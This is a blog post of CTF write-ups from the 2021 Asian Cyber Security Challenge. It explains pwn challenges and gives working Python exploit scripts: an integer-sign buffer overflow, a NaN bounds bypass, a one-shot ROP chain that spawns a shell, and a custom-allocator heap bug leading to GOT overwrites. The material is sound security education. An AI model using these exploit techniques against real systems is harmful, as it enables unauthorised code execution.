---
layout: post
title: "Asian Cyber Security Challenge 2021"
description: ""
date: 2021-09-19
tags: [ctf,pwn,web,crypto]
comments: true
---

## Summary

The **Asian Cyber Security Challenge 2021 (ACSC)** just completed over this weekend.
It is the first iteration of the competition, which takes the form of a CTF.
The goal of the competition was to select the *15 players* under the age of 26 to represent Asia in the **International Cybersecurity Challenge (ICC)**.

At the end of the competition. Here are the top 20 standings.

![Top 20 scoreboard]({{site.baseurl}}/ctf/acsc21/scoreboard.png)

> The greyed out players indicated that they are not eligible for rankings.

## Challenges

I solved the following challenges and have prepared writeups for each. If you wish to skip ahead, you can click on each of the entries to skip to the exploit/writeup. (Not all writeups are done, I will be updating this periodically)

| Challenge | Category | Points | Writeup |
| :-------: |:--------:| :----: | :-----: |
| filtered | pwn | 100 | [🔗](#filtered-pwn) |
| histogram | pwn | 200 | [🔗](#histogram-pwn) |
| CArot | pwn | 320 | [🔗](#carot-pwn) |
| bvar | pwn | 380 | [🔗](#bvar-pwn) |
| sysnote | pwn | 400 | [🔗](#sysnote-pwn) |
| RSA stream | crypto | 100 | ❌ |
| sugar | rev | 170 | ❌ |
| encoder | rev | 270 | ❌ |
| API | web | 220 | ❌ |
| Favorite Emojis | web | 330 | ❌ |

## CTF thoughts

In the past year++, I've not been playing online CTFs as I'd lost interest in them after a while (perhaps due to army, covid, burnout, ...).
In fact, I'd only continued playing local CTFs to try to earn some cash 🤑.

So when the announcement for this CTF came along, I had no intention to play as I felt I would not be prepared to qualify.
Furthermore, the finals date was originally in December, which meant that I would have to take overseas leave from my military service (basically _impossible_).
However, I did feel some [FOMO](https://www.verywellmind.com/how-to-cope-with-fomo-4174664) as qualifiying for overseas CTFs has always been a great motivator for me.

Somewhere along the line. I couldn't help but be drawn to playing the CTF, and I began discussing the idea with my good friend [daniel](https://daniao.ws/).

<center>
<img src="{{site.baseurl}}/ctf/acsc21/convo.png" />
</center>

After deciding to give it a try, I begin prep-ing by learning a bit about JIT pwning (v8), and (intended) to practice Linux kernel pwns as well.
I was predicting that there would at least be baby+ level challenges for these genres, and that other players who had been keeping up with the times would be able to solve them.
If I could not solve these, that would put me at a great disadvantage, especially if they were baby level challenges.
In the end, I was distracted by Flare-on and only managed to practice JIT pwning (oops).

By some stroke of luck, it turned out that the finals in December was postponed to June 2022 (when I would be out of military service!) This only served to motivate me further to do my best.

<center>
<img height=600 src="{{site.baseurl}}/ctf/acsc21/tweet.png" />
</center>

In the end, I feel I managed to do pretty well in the competition, and I'm pretty satisfied with myself for that 😊.

But enough of the storytelling, here are the writeups!


## Writeups

### filtered (pwn)
> Filter invalid sizes to make it secure!
> 
> Backup: nc 167.99.78.201 9001
> 
> nc filtered.chal.acsc.asia 9001
>
> filtered.tar.gz_9a6cb1b3eafce70ff549ba6b942f34a9.gz

The code for this challenge was rather straightforward.

{% highlight C %}
/* Call this function! */
void win(void) {
  char *args[] = {"/bin/sh", NULL};
  execve(args[0], args, NULL);
  exit(0);
}
...
int main() {
  int length;
  char buf[0x100];

  /* Read and check length */
  length = readint("Size: ");
  if (length > 0x100) {
    print("Buffer overflow detected!\n");
    exit(1);
  }

  /* Read data */
  readline("Data: ", buf, length);
  print("Bye!\n");

  return 0;
}
{% endhighlight %}

Provided a `win` function that we can jump to when we achieve code execution, we have to cause a buffer overflow even though our input size is constrained.

However, we observe that `length` is an **int** and `readint` uses `atoi`(which allows negative numbers) to read.

{% highlight C %}
int readint(const char *msg) {
  char buf[0x10];
  readline(msg, buf, 0x10);
  return atoi(buf);
}
...
/* Entry point! */
int main() {
  int length;
  ...
}
{% endhighlight %}

Therefore, we can provide a _negative_ length, that when interpreted as a length by `readline` will be a large size instead.
This allows us to buffer overflow and overwrite the saved return pointer on stack, giving us code execution to get the flag!

{% highlight Python %}
def exploit(r):
    rop = "A"*280
    rop+= p64(e.symbols["win"])
    sleep(0.1)
    r.sendline("-1")
    sleep(0.1)
    r.sendline(rop)

    r.interactive()
    return
{% endhighlight %}

`ACSC{GCC_d1dn'7_sh0w_w4rn1ng_f0r_1mpl1c17_7yp3_c0nv3rs10n}`

### histogram (pwn)
> https://histogram.chal.acsc.asia
>
> histogram.tar.gz_d48db29f562ee608ce5bd346221b9a2a.gz

This was a cool challenge with a web interface that allowed us to submit `csv` files that would be parsed by a binary in the backend.
The binary does some calculations to produce a histogram for the web frontend.

<center>
<img src="{{site.baseurl}}/ctf/acsc21/histogram/web.png" />
</center>

The important pieces of code are here:

{% highlight C %}
#define WEIGHT_MAX 600 // kg
#define HEIGHT_MAX 300 // cm
#define WEIGHT_STRIDE 10
#define HEIGHT_STRIDE 10
#define WSIZE (WEIGHT_MAX/WEIGHT_STRIDE)
#define HSIZE (HEIGHT_MAX/HEIGHT_STRIDE)

int map[WSIZE][HSIZE] = {0};
int wsum[WSIZE] = {0};
int hsum[HSIZE] = {0};

/* Call this function to get the flag! */
void win(void) {
  ...
}

int read_data(FILE *fp) {
  /* Read data */
  double weight, height;
  int n = fscanf(fp, "%lf,%lf", &weight, &height); // [1]
  ...
  /* Validate input */                             // [2]
  if (weight < 1.0 || weight >= WEIGHT_MAX)
    fatal("Invalid weight");
  if (height < 1.0 || height >= HEIGHT_MAX)
    fatal("Invalid height");

  /* Store to map */
  short i, j;
  i = (short)ceil(weight / WEIGHT_STRIDE) - 1;
  j = (short)ceil(height / HEIGHT_STRIDE) - 1;
  
  map[i][j]++;                                     // [3]
  wsum[i]++;
  hsum[j]++;

  return 0;
}
{% endhighlight %}

As you can see, the goal is to call the `win` function.
Through our CSV file, we are allowed to provide many pairs of doubles to the function `read_data` **[1]**.
These doubles are constrained **[2]** such that when they are finally used to calculate indexes for our maps at **[3]**, there will be no risk of memory corruption/overflow.

At a first glance, this code looks perfectly okay.
However, if we read more into the [**IEEE 754**](https://en.wikipedia.org/wiki/IEEE_754) standard for floating points (which is used in extended form for our doubles) we can note some interesting information.

> The standard defines:
>
> arithmetic formats: sets of binary and decimal floating-point data, which consist of finite numbers (including signed zeros and subnormal numbers), infinities, and special "not a number" values (NaNs)

_'infinities, and special "not a number" values (NaNs)'_, this sounds very promising!

We can try it out by providing the value `nan` to fscanf!
With `nan` we are able to bypass the bounds checking as `nan` will not hold true for any of the comparisons.
Then, through some confusing conversions which I did not bother to understand during the CTF, we end up getting a negative value of `i`!

By trial-and-error, we can then modify the values of `i` and `j` such that `map[i][j]++` will modify other areas in memory :D
For my exploit, I decided to increment the **GOT** pointer of `exit` such that it pointed to `win`.
Then, I can provide a value that does not pass the bounds checking, which will cause `exit` to be called!

The exploit looked like so

```
-nan, 101.0
-nan, 101.0
-nan, 101.0
... total 456 rows of this
-nan, 101.0
inf, inf
```

`ACSC{NaN_demo_iiyo}`

### CArot (pwn)
> When dealing with proxy, it is often the case that you only have one "shot".
> 
> Backup: nc 167.99.78.201 11451
> 
> nc 167.99.78.201 11451
>
> carot.tar.gz_2a202e4492e97852fa72ab0e38dc48eb.gz

This challenge was a fake HTTP server written in C, with a proxy that only allowed a single request from the user.

The proxy looked like so:

{% highlight Python %}
#!/usr/bin/python3
...
LIMIT = 4096

buf = b''
while True:
  s = stdin.buffer.readline()
  buf += s

  if len(buf) > LIMIT:
    print('You are too greedy')
    exit(0)

  if s == b'\n':
    break

p = socket(AF_INET, SOCK_STREAM)
p.connect(("localhost", 11452))
p.sendall(buf)

sleep(2)

p.setblocking(False)
res = b''
try:
  while True:
    s = p.recv(1024)
    if not s:
      break
    res += s
except:
  pass

stdout.buffer.write(res)
{% endhighlight %}

The C code for the webserver was rather lengthy, so I shortened it to highlight the bug we are dealing with.

{% highlight C %}
char* http_receive_request() {
  ...
  char buffer[BUFFERSIZE] = {};
  scanf("%[^\n]", buffer);
  ...
  return ret;
}

int main() {
  setbuf(stdout, NULL);
  while (1) {
    char* fname = http_receive_request();
    if (fname == NULL) {
      http_send_reply_bad_request();
    } else {
      try_http_send_reply_with_file(fname);
      free(fname); 
    }

    if (connect_mode != KEEP_ALIVE) break;
  }
}
{% endhighlight %}

As you can see, the bug is rather trivial, reading from input without any bounds checking/length constraints using `scanf("%[^\n]")`.
This will allow us to do a buffer overflow and perform ROP!

However, this will remind us of the proxy we encountered earlier.
In a usual ROP chain trying to achieve code execution on the server, we need to leak offsets from shared libraries like libc in order to get better functions to use for ROPing.
After we recieve the leaks, we then prepare a second stage ROP payload with the leaks to get full code execution (shell).
But the one-shot proxy will prevent this :/
Even if we can read leaks from the proxy, it will not allowed us to perform additional inputs to the webserver after our initial request.

Thus, the challenge reduces down to a game of ROP chain creativity and gadget discovery.
For my exploit, I used the following powerful gadgets to create primitives.

#### Write-What-Where

For writing strings to memory, or additional ROP chain payloads to pivot into, I made use of the `scanf` gadget.
With `scanf("%[^\n]", pointer)`, we can write data to arbitrary locations in memory. The data just needs to be sent with our initial ROP chain to stay within the `stdin` of the process.
After `scanf` is called by our ROP chain, it will then start to read these pre-sent payloads one line per scanf call.

Furthermore, I had another gadget that could write to memory given control of a few registers.

```
; Arb Write
0x0000000000400fd3: mov qword ptr [rbp - 8], rax; mov rax, qword ptr [rbp - 8]; add rsp, 0x260; pop rbp; ret;
```

#### Read-Where

```
; Arb Read
0x0000000000400b7d: mov rax, qword ptr [rbp - 8]; add rsp, 0x10; pop rbp; ret;
```

#### Add-What-Where
```
; Arb Add
0x0000000000400888 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret                     
```

#### Exploit
With these gadgets, we can perform a routine like so:

1. Use `Read-Where` to load a libc pointer from GOT into `rax`
2. Use `Write-What-Where` to write the libc pointer in `rax` into a writeable area in `.bss`
3. Use `Add-What-Where` to increment this libc pointer into our gadget (like system or execv)
4. Load a second stage rop chain into `.bss` and pivot to it

Here is the exploit that does this.

{% highlight Python %}
extra = "\n"
rdi = lambda x : p64(0x4010d3)+p64(x)
rsi = lambda x : p64(0x4010d1)+p64(x)*2
rbp = lambda x : p64(0x400828)+p64(x)
r15 = lambda x : p64(0x4010d2)+p64(x)
ret = lambda : p64(0x400829)

def arb_write(p, s):
    global extra
    # "%[^\n]" 0x4012F0
    rop = rdi(0x4012F0)
    rop+= rsi(p)
    rop+= p64(e.symbols["__isoc99_scanf"])
    rop+= p64(e.symbols["getchar"])
    extra += s+'\n'
    return rop

def arb_read_rax(p):
    rop = rbp(p+8)
    rop+= p64(0x400b7d)
    rop+= p64(0xdeadbeef)*3
    return rop

def arb_write_rax(p):
    rop = rbp(p+8)
    rop+= p64(0x400fd3)
    rop+= "\x00"*(0x260+8)
    return rop

def align(r):
    if (len(r)-536)%16:
        return r+ret()
    else:
        return r

def exploit(r):
    global extra

    cmd = sys.argv[2]
    mini_rop = rdi(0x602000)
    mini_rop+= rsi(0x602050)
    
    # Write strings
    rop = "GET ".ljust(536, '\x00')
    rop = align(rop)
    rop+= arb_write(0x602000, 
            "/bin/sh\x00-c\x00{}".format(cmd).ljust(0x50, '\x00')+
            p64(0x602000)+
            p64(0x602000+len("/bin/sh\x00"))+
            p64(0x602000+len("/bin/sh\x00-c\x00"))+
            p64(0)
    )
    rop = align(rop)
    rop+= arb_write(0x602f00, mini_rop)

    # Copy libc ptr from got
    rop+= arb_read_rax(e.got["__libc_start_main"])
    rop+= arb_write_rax(0x602f00+len(mini_rop))

    # subtract dword
    """
    0x0000000000400888 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret                     
    0x00000000004010ca: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;                    
    """
    rop+= p64(0x4010ca)
    rop+= p64(libc.symbols["execv"]-libc.symbols["__libc_start_main"])
    rop+= p64(0x602f00+0x3d+len(mini_rop))
    rop+= p64(0)*4
    rop+= p64(0x400888)

    # pivot
    """
    0x00000000004010cd: pop rsp; pop r13; pop r14; pop r15; ret;                             
    """
    rop+= p64(0x4010cd)
    rop+= p64(0x602f00-8*3)

    rop+= extra
    sleep(0.1)
    print(len(rop))
    r.sendline(rop)

    r.interactive()
    return
{% endhighlight %}

`ACSC{buriburi_1d3dfb9bf7654412}`

### bvar (pwn)
> Create your own creations to win the shell!
> 
> Backup: nc 167.99.78.201 7777
> 
> nc 167.99.78.201 7777
>
> bvar.tar.gz_76dbbfe02ffa27c893fc154a97df58a2.gz

This challenge was a menu-esque pwn that implemented its own allocator functions.
The allocator was similar to a bump-allocator, but with an additional freelist mechanism.

{% highlight C %}
char c_memory[1000];
unsigned int c_size = 0;

char* freelist[10];
int free_head=0;

char* c_malloc(unsigned int size){
	int temp = 0;

	if(size < 4)
		size = 4;

	if(c_size + (size+4) > 999){
		printf("No Space :(\n");
		exit(1);
	}

	if(free_head==0){
		temp = (size+4);
		memcpy(&c_memory[c_size],&temp,4);
		temp = c_size + 4;
		c_size += (size + 4);
		return &c_memory[temp];
	}
	else{
		return freelist[--free_head];
	}
}

void c_free(char *ptr){
	if(free_head==10)
		return;
	freelist[free_head++] = ptr; 
}
{% endhighlight %}

As you can see, in the above code, the `freelist` does not track the size of allocations that were added. 
This could easily lead to a heap overflow as a smaller chunk can be returned to service a large allocation.

The `main` of the program implemented a sort of key-value store REPL that allows us to create nodes that contain key-value pairs.
The code is quite lengthy, so instead I will showcase some of the features in action.

```
$ ./bvar
>>> A=a
>>> A
a
>>> delete:A
delete!
>>> clear
clear!
>>> A
>>> B=b
>>> edit:B
C
>>> C
b
```

One behaviour that was buggy was the `delete` functionality.

{% highlight C %}
int main(){
  ...
	init();
	while(1){
		...
		if(split){
      ...
		}

		else{
			if(!strncmp("delete",input,6)){
				for(temp=head; temp!=NULL; temp=temp->next){
					if(!strncmp(temp->data->name,&input[7],4)){ // [1]
						if(temp->prev)
							temp->prev->next = temp->next;
						if(temp->next)
							temp->next->prev = temp->prev;

						c_free(temp->data);                       // [2]
						c_free(temp);

						printf("delete!\n");
						break;
					}
				}
			}
      ...
		}
	}
}
{% endhighlight %}

When we try to `delete` a node, it will walk the linked-list and detach **[1]** our node.
Following this, it free the allocations used for the node **[2]**.
However, the `head` of the linked-list is not updated if we free the first node.
This can lead to abusable behaviour.

At this point in the CTF while I was solving this, my brain was beginning to shut down.
Instead of trying to fully understand the many moving parts of the challenge (doubly-linked-list of nodes, freelist, heap layout), I decided to use trial and error.

I was already aware of behaviours that were buggy (`delete` and `freelist`).
Therefore, I just tried to trigger the behaviours, then inspect in memory to see how I can abuse the layout I was "given".
This way, I can avoid thinking too much about [heap fengshui](https://en.wikipedia.org/wiki/Heap_feng_shui) and instead, just exploit using whatever fengshui I happened to create.

The first behaviour I abused was deleting a node and then allocating a new one.
This will cause a heap overflow due to the freelist behaviour.

{% highlight Python %}
def exploit(r):
    f("AAA=aaaaaa")
    f("BBB=bbbb")
    f("delete:BBB")
    f("CCC=cccc\n")
    r.interactive()
{% endhighlight %}

We can thinking too much about the behaviour, and just inspect the memory in gdb.

```
# Node for node "CCC"
0x00005555555575b0│+0x0000: 0x00005555555575c0  --- .data ----+
0x00005555555575b8│+0x0008: 0x0000000000000000                |
0x00005555555575c0│+0x0010: 0x0000555555557594  <-------------+
0x00005555555575c8│+0x0018: 0x0000000000434343 ("CCC"?)
0x00005555555575d0│+0x0020: 0x0000555555557594
```

As we can see, the `data` struct for the node is at 0x00005555555575c0 with

{% highlight C %}
{
  .data = "\xc0\x75\x55\x55\x55\x55\x00\x00"
  .name = "CCC"
}
{% endhighlight %}

So _somehow_, we've created an arrangement that leads to a leak! We can just type "CCC" into the repl and we'll leak a heap pointer for us.

```
>>> CCC
�uUUUU
```

We can repeat this strategy for the other bug we found, and see what it yields us!
Since the bug occurs when we free the first node, we just create one node and free it.

{% highlight Python %}
def exploit(r):
    f("AAA=aaaa")
    f("delete:AAA")
    f("BBB=bbbb")
    r.interactive()
{% endhighlight %}

When we view this in the debugger, we get this!

```
# Node for node "BBB"
                     +--------------<---------------+
                     |                              |
0x0000555555557594│  +->--- 0x0000555555557594  ->--+
0x000055555555759c│+0x0008: 0x0000555555557584  →  0x0000555555557594  →  0x0000555555557594  →  [loop detected]
0x00005555555575a4│+0x0010: 0x0000000000000000
```

By some magic, we've created a situation where `node->data == node`.
This gives us a cool behaviour, because it will allow for `&node->next == &node->data.name`.

This means we can control the doubly-linked-list!

With some more magickery, this powerful primitive allows us to solve the challenge by overwriting a pointer in GOT.

{% highlight Python %}
def exploit(r):
    f = lambda x : r.sendafter(">>> ", x)

    # Leak
    f("AAA=aaaaaa")
    f("BBB=bbbb")
    f("delete:BBB")
    f("CCC=cccc\n")
    f("CCC")
    pie_base = u64(r.recvline().rstrip().ljust(8, '\x00'))-0x3594
    log.info("pie_base: {:#x}".format(pie_base))

    # Got pointer (leak exit)
    f("GOT="+p64(pie_base+e.got["exit"])[:6])
    f("clear")

    # Arbitrary Chunk (libc leak)
    f("AAA=aaaa")
    f("delete:AAA")
    f("BBB=bbbb")
    g = lambda x: p32((pie_base+x)&0xffffffff)
    f("edit:"+g(0x3608))
    sleep(0.1)
    r.send(g(0x35dc))
    f("\n")
    libc_base = u64(r.recvline().rstrip().ljust(8, '\x00'))-libc.symbols["exit"]
    log.info("libc_base: {:#x}".format(libc_base))
    f("clear")

    # Got pointer (overwrite strlen)
    f("GOT="+p64(pie_base+e.got["strlen"]-8)[:6])
    f("clear")

    # Arbitrary Chunk (GOT overwrite)
    strlen = libc_base + 0x18b660# libc.symbols["strlen"]
    system = libc_base + libc.symbols["system"]
    print(hex(strlen))
    f("AAA=aaaa")
    f("delete:AAA")
    f("BBB=bbbb")
    f("edit:"+g(0x3660))
    sleep(0.1)
    r.send(g(0x3634))
    h = lambda x: p32(x & 0xffffffff)
    r.send("edit:"+h(strlen))
    sleep(0.1)
    r.send(h(system))

    r.interactive()
    return
{% endhighlight %}

`ACSC{PWN_1S_FUN_5W33T_D3liC1ous :)}`

### sysnote (pwn)

To be written, exploit for now: [link](https://gist.github.com/lordidiot/7990a49e1336b21abc6bd90c6f837cd6).

`ACSC{m0mmy, 1 r34lly h4t3 7hi5 n0te}`